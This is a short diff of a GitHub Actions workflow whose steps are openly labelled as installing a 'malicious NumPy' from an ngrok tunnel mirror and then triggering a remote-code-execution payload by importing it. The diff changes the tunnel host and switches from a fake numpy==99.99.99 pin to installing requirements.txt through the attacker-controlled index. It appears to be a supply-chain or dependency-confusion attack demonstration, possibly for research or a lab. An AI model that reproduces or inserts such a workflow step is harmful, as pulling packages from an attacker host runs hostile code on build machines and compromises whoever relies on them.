@@ -30,7 +30,7 @@ jobs:
       - name: 📦 Install malicious NumPy from ngrok mirror
         run: |
           echo "[*] Installing fake numpy from ngrok mirror..."
-          pip install --find-links https://74cb59ca3c50.ngrok-free.app numpy==99.99.99
+          pip install --find-links https://b62ea0b296f6.ngrok-free.app -r requirements.txt
 
       - name: 🔥 Trigger RCE payload by importing numpy
         run: |
